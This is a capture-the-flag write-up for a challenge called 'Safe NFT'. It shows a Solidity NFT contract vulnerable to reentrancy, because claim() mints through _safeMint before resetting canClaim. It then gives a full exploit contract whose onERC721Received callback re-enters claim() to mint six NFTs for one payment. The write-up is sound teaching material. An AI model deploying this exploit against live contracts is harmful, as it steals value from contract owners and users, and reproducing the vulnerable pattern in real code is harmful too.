# Safe NFT

## Challenge

We get one contract for a NFT:

```solidity
// SPDX-License-Identifier: UNLICENSED

pragma solidity 0.8.7;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC721/extensions/ERC721Enumerable.sol";

contract safeNFT is ERC721Enumerable {
    uint256 price;
    mapping(address=>bool) public canClaim;

    constructor(string memory tokenName, string memory tokenSymbol,uint256 _price) ERC721(tokenName, tokenSymbol) {
        price = _price; //price = 0.01 ETH
    }

    function buyNFT() external payable {
        require(price==msg.value,"INVALID_VALUE");
        canClaim[msg.sender] = true;
    }

    function claim() external {
        require(canClaim[msg.sender],"CANT_MINT");
        _safeMint(msg.sender, totalSupply()); 
        canClaim[msg.sender] = false;
    }
}
```

The goal is to claim multiple NFTs for the price of one

## Solution

Here we have a very simple reentrancy attack. THe _safeMint functionality calls back to our contract, which in the end lets us call back multiple times before the canClaim gets reset. We can write a simple exploit contract to exploit the vulnerability:

```solidity
// SPDX-License-Identifier: UNLICENSED

pragma solidity 0.8.7;

import "./Chal.sol";

contract exploiter {

    int claims;
    safeNFT NFT_contract;

    constructor(address target_addr)
    {
        claims = 0; 
        NFT_contract = safeNFT(target_addr);
    }

    function attack() payable public
    {
        require(msg.value == 0.01 ether, "You need to send 0.01 ether man :("); // 10000000000000000 Wei

        NFT_contract.buyNFT{value: 0.01 ether}();
        NFT_contract.claim();
    }

    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data) external returns (bytes4)
    {
        if (claims < 5)
        {
            claims += 1;
            NFT_contract.claim();
        }

        return this.onERC721Received.selector;
    }
}
```

Passing the contract address to this contract in the constructor and then running this contract, we can get 6 NFTs for the price of 1.

